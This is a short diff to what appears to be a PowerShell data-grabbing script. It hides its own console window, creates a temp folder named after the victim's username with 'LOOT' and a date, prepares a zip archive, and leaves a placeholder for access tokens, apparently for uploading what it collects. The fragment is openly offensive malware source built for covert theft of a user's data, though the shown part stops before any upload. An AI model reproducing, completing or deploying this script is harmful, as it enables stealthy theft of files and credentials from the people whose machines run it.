@@ -1,4 +1,3 @@
-# Hide window
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
 add-type -name win -member $i -namespace native
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
@@ -7,7 +6,7 @@ add-type -name win -member $i -namespace native
 $FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
 $FileName = "$FolderName.txt"
 $ZIP = "$FolderName.zip"
-New-Item -Path $env:tmp\$FolderName -ItemType Directory | Out-Null
+New-Item -Path $env:TEMP\$FolderName -ItemType Directory | Out-Null
 
 # Enter your access tokens below
 #$db = ""
